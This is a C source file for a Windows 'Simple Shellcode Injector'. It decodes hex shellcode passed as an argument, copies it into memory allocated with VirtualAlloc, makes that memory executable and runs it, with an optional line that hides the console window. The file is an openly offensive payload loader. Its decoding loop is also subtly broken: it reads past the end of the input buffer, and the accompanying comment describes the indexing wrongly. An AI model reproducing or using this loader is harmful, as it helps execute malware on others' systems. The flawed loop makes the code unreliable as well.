#include <stdio.h>
#include <Windows.h>

int main(int argc, char *argv[]) {
    //Uncomment to Hide cmd window
    //HWND hWnd = GetConsoleWindow();
    //ShowWindow( hWnd, SW_HIDE );

    unsigned int char_in_hex;

    unsigned static char logo [] = 
    " +-+-+-+ +-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+\n"
    " |S|S|I| |(|S|i|m|p|l|e| |S|h|e|l|l|c|o|d|e| |I|n|j|e|c|t|o|r|)|\n"
    " +-+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+\n"
    " |b|y| |g|w|e|e|p|e|r|x|                                        \n"
    " +-+-+ +-+-+-+-+-+-+-+-+\n";


    char *shellcode=argv[1];
    unsigned int iterations=strlen(shellcode);
    unsigned int memory_allocation=sizeof(char)*strlen(shellcode);
   
 
    printf("%s\n\n", &logo);

    /*
    convert to shellcode:

    Iterations is equal to strlen(shellcode) which is the total number of characters (in the above example 1666 shellcode[0] to shellcode[1665]).
    We convert in pairs, so for i=0 we are going to read shellcode[0] and shellcode[1] in order to create one byte from those 2 chars.
    The last byte will be created for i=1664 which will convert the characters shellcode[1664] and shellcode[1665]. So the last time we are going to enter the loop
    will be for i = 1664, meaning i<16665 which is i < 1666-1 or i < iterations-1
    */

    for(unsigned int i = 0; i< iterations-1; i++) {
        sscanf(shellcode+2*i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }


    void *exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);

    printf("Ready? Go!");
    (*(void (*)()) exec)();
    
    return 0;
}
